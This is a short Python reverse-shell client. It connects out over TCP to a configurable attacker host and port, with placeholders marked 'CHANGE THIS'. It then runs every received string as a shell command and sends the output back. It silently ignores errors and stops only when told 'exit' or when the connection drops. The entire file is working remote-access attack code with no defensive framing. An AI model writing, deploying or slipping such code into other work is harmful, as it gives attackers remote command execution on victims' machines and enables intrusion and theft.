#!/usr/bin/env python3

import socket
import subprocess
import os

server = "127.0.0.1" # CHANGE THIS
port = 1234 # CHANGE THISs

if __name__ == "__main__":
	tries = 0
	try:
		# create tcp ipv4 socket, try connecting to the server
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((server, port))
		# recv commands and execute
		while True:
			try:
				command = client.recv(1024)
				if command.decode() == "": # check if the server has terminated connection
					break
				if command.decode().lower() == "exit": # check if the command is to terminate the connection
					break

				output = subprocess.run(command, shell=True, capture_output=True) #execute the commands
				if output.stderr.decode() == "":
					result = output.stdout
				else:
					result = output.stderr
				client.send(result)
			except KeyboardInterrupt:
				break
			except:
				continue
	except:
		exit()